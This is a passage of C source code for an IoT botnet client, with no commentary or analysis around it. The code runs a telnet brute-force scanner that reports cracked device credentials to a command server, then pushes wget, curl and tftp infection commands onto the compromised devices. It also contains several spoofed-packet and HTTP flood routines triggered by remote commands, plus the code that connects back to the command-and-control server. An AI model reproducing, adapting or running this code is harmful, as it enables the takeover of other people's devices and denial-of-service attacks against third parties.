						if(contains_fail(fds[i].sockbuf)) {
							advance_state(&fds[i], 0);
						}
						else if(contains_success(fds[i].sockbuf)) {
							if(fds[i].complete == 2) {
								advance_state(&fds[i], 7);
							} else {
								sockprintf(avengerCommSock, "\x1b[1;35m Avengers Searching For Thanos boxes -=-=-=-=-=- Found One! Creds:%s:%s:%s ", get_telstate_host(&fds[i]), user[fds[i].usernameInd], pass[fds[i].passwordInd]);
								advance_state(&fds[i], 7);
							}
						} else {
							reset_telstate(&fds[i]);
						}
						continue;
					}
					if(fds[i].totalTimeout + 7 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 7: {
					fds[i].totalTimeout = time(NULL);
					if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) <0);
					if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
					if(send(fds[i].fd, infect_wget, strlen(infect_wget), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					else if(send(fds[i].fd, infect_curl, strlen(infect_curl), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					else if(send(fds[i].fd, infect_tftp1, strlen(infect_tftp1), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					else if(send(fds[i].fd, infect_tftp2, strlen(infect_tftp2), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					else if(fds[i].totalTimeout + 25 < time(NULL)) {
						if(fds[i].complete !=3){
						}
						reset_telstate(&fds[i]);
					}
					break;
				}
			}
		}
	}
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	char *vse_payload;
    int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void udpfl00d(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32) {
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) {
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister) {
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd) {
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
return;
}
int counter = 50;
while(counter--) {
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( findRandIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister) {
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void vsefl00d(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
	char *vse_payload;
    int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32) {
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) {
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister) {
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd) {
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
return;
}
int counter = 50;
while(counter--) {
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( findRandIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister) {
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}
void lynxFl00d(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->ack = 1;
		tcph->syn = 1;
		tcph->psh = 1;
		tcph->ack = 1;
		tcph->urg = 1;
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void ackFl00d(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void stdfl00d(unsigned char *ip, int port, int secs) {
  int iSTD_Sock;
  iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
  time_t start = time(NULL);
  struct sockaddr_in sin;
  struct hostent * hp;
  hp = gethostbyname(ip);
  bzero((char * ) & sin, sizeof(sin));
  bcopy(hp->h_addr, (char * ) & sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = port;
  unsigned int a = 0;
  while (1) {
    if (a >= 50) {
      char name_buf[1024];
      rand_alphastr(name_buf);
      char *stdstring = name_buf;
      send(iSTD_Sock, stdstring, STD2_SIZE, 0);
      connect(iSTD_Sock, (struct sockaddr * ) & sin, sizeof(sin));
      if (time(NULL) >= start + secs) {
        close(iSTD_Sock);
        _exit(0);
      }
      a = 0;
    }
    a++;
  }
}
int socket_connect(char *host, in_port_t port) {
struct hostent *hp;
struct sockaddr_in addr;
int on = 1, sock;     
if ((hp = gethostbyname(host)) == NULL) return 0;
bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
sock = socket(PF_INET, SOCK_STREAM, 0);
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
if (sock == -1) return 0;
if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
return sock;
}

int socket_connect2(char *host, char *port) 
{
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) 
	{
        exit(0);
    }
 
    for(p = servinfo; p != NULL; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) 
		{
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) 
		{
            close(sock);
            continue;
        }
        break;
    }
	
    if(p == NULL) 
	{
        if(servinfo)
            freeaddrinfo(servinfo);
        //fprintf(stderr, "No connection could be made to %s:%s\n", host, port);
        exit(0);
    }
 
    if(servinfo)
        freeaddrinfo(servinfo);
    //fprintf(stderr, "[Connected -> %s:%s]\n", host, port);u
    return sock;
} 

void httpfl00d(char *method, char *host, in_port_t port, char *path, int timeEnd, int power)
{
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++)
    {
        sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, UserAgents[(rand() % 39)]);
        if (fork())
        {
            while (end > time(NULL))
            {
                socket = socket_connect(host, port);
                if (socket != 0)
                {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}

void httphex(char *method, char *host, in_port_t port, int timeEnd, int power)
{
	int socket, socket2, i, end = time(NULL) + timeEnd, sendIP = 0;
	char choosepath[1024];
	char request[512], buffer[1];
	const char *methods[] = {"GET", "HEAD", "POST"};
	sprintf(choosepath, "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A");

	for (i = 0; i < power; i++)
	{
		if(!strcmp(method, "RANDOM"))
		{
			sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", methods[(rand() % 3)], choosepath, host, UserAgents[(rand() % 5)]);
		}
		else
		{
			sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, choosepath, host, UserAgents[(rand() % 5)]);
		}
		
		
		if (fork())
		{
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				socket2 = socket_connect2(host, port);
				if (socket != 0)
				{
					write(socket, request, strlen(request));
					write(socket2, request, strlen(request));
					read(socket, buffer, 1);
					read(socket2, buffer, 1);
					close(socket);
					close(socket2);
				}
			}
			exit(0);
		}
	}
}

void processCmd(int argc, unsigned char *argv[])
{
	    if (!strcmp(argv[0], "HH"))
	{
		if (argc < 5 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) return;
		if (listFork()) return;
		httphex(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
		exit(0);
	}
       
	   	if(!strcmp(argv[0], "REP")) {
		if(!strcmp(argv[1], "STOP")) {
			if(scanPid == 0) return;
			kill(scanPid, 9);
			scanPid = 0;
		}
		if(!strcmp(argv[1], "START")) {	
			if(scanPid != 0) return;
			uint32_t parent;
			parent = fork();
			int threads = 1000;
			int timeout = 10;
			if (parent > 0) { scanPid = parent; return;}
			else if(parent == -1) return;
			TelnetRep(timeout, threads);
			_exit(0);
		}
	}
	   
if (!strcmp(argv[0], "H"))
    {
        if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
        if (listFork()) return;
        httpfl00d(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
        exit(0);
    }
	
       if(!strcmp(argv[0], "U")) {
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
int packetsize = atoi(argv[5]);
int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
if(strstr(ip, ",") != NULL) {
unsigned char *hi = strtok(ip, ",");
while(hi != NULL) {
if(!listFork()) {
udpfl00d(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (!listFork()){
udpfl00d(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
}
return;
}

if(!strcmp(argv[0], "V")) {
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
int packetsize = atoi(argv[5]);
int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
if(strstr(ip, ",") != NULL) {
unsigned char *hi = strtok(ip, ",");
while(hi != NULL) {
if(!listFork()) {
vsefl00d(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (!listFork()){
vsefl00d(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
}
return;
}
		
		
		if(!strcmp(argv[0], "S")) {
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
return;
} 
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL) {
unsigned char *hi = strtok(ip, ",");
while(hi != NULL) {
if(!listFork()) {
stdfl00d(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
stdfl00d(ip, port, time);
_exit(0);
}
}
	
        if(!strcmp(argv[0], "ACK"))
        {
                if(argc < 6)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        ackFl00d(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        ackFl00d(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }
		if(!strcmp(argv[0], "LYNX"))
        {
                if(argc < 6)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        lynxFl00d(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        lynxFl00d(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }

	if(!strcmp(argv[0], "KT"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
        }

		
}

int initConnection()
{
        unsigned char server[4096];
        memset(server, 0, 4096);
        if(avengerCommSock) { close(avengerCommSock); avengerCommSock = 0; }
        if(AvengerSever + 1 == SERVER_LIST_SIZE) AvengerSever = 0;
        else AvengerSever++;
        szprintf(server, "%d.%d.%d.%d", ip1, ip2, ip3, ip4);
        int port = bot_port;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        avengerCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(avengerCommSock, server, port, 30)) return 1;

        return 0;
}

int getOurIP() {
int sock = socket(AF_INET, SOCK_DGRAM, 0);
if(sock == -1) return 0;
struct sockaddr_in serv;
memset(&serv, 0, sizeof(serv));
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = inet_addr("8.8.8.8");
serv.sin_port = htons(53);
int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
if(err == -1) return 0;
struct sockaddr_in name;
socklen_t namelen = sizeof(name);
err = getsockname(sock, (struct sockaddr*) &name, &namelen);
if(err == -1) return 0;
ourIP.s_addr = name.sin_addr.s_addr;
int cmdline = open("/proc/net/route", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL) {
if(strstr(linebuf, "\t00000000\t") != NULL) {
unsigned char *pos = linebuf;
while(*pos != '\t') pos++;
*pos = 0;
break;
}
memset(linebuf, 0, 4096);
}
close(cmdline);
if(*linebuf) {
int i;
struct ifreq ifr;
strcpy(ifr.ifr_name, linebuf);
ioctl(sock, SIOCGIFHWADDR, &ifr);
for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
}
close(sock);
}

char *getBuild() { 
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || (__ARM_ARCH_7T__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SH4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "PPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UKN";
    #endif
}

int main(int argc, unsigned char *argv[])
{
        
        if(SERVER_LIST_SIZE <= 0) return 0;
	    strncpy(argv[0],"",strlen(argv[0]));
		printf("\x1b[35;1mVery private botnet\r\n");
		srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
        table_init();
        watchdog_maintain();

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                                        //N
                        }
        } else {
            //N
        } 

        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }

		sockprintf(avengerCommSock, "\x1b[1;37m<\x1b[1;35mDevices Connected\x1b[1;37m> <\x1b[1;35m%s\x1b[1;37m> <\x1b[1;35m%s\x1b[1;37m>", getBuild(), inet_ntoa(ourIP));


                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(avengerCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                       

                        unsigned char *m3ss4ge = commBuf;

                        if(*m3ss4ge == '.')
                        {
                                unsigned char *nickMask = m3ss4ge + 1;
